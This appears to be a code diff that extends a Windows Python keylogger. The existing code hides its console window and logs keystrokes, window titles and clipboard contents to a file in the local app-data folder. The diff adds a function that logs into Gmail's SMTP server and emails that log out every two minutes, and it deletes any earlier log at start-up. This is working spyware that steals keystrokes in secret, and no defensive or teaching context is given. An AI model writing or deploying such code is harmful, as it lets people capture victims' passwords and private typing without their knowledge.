@@ -1,5 +1,10 @@
 import ctypes
 import logging
+import smtplib
+import datetime
+import schedule
+import time
+import os
 
 # libs
 kernel32 = ctypes.windll.kernel32
@@ -7,6 +12,22 @@ user32 = ctypes.windll.user32
 
 # Hide window
 user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
+
+# Mailing function
+EMAIL = 'yourmail@domain.com' # Enter your email id
+PASSWORD = 'yourmailpassword' # Your email id's password here
+
+def sendMail():
+    log_dir = os.environ['localappdata']
+    log_name = 'applog.txt'
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(EMAIL, PASSWORD)
+    f = open(os.path.join(log_dir, log_name), 'r')
+    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
+    s.sendmail(EMAIL, EMAIL, message) # it will mail to yourself
+    s.quit()
+    f.close()
 
 def get_current_window():
 
@@ -52,6 +73,10 @@ def get_clipboard():
         CloseClipboard() # Close the clipboard
 
 def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
+    schedule.every(2).minutes.do(sendMail)
+    # Delete logger before starting
+    if os.path.exists(log_dir +"\\"+ log_name):
+        os.remove(log_dir +"\\"+ log_name)
 
     # Logger
     logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')
@@ -62,7 +87,7 @@ def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
     line = [] # Stores the characters pressed
 
     while True:
-
+        schedule.run_pending()
         if current_window != get_current_window(): # If the content of current_window isn't the currently opened window
             current_window = get_current_window() # Put the window title in current_window
             logging.info(str(current_window).encode('utf-8')) # Write the current window title in the log file
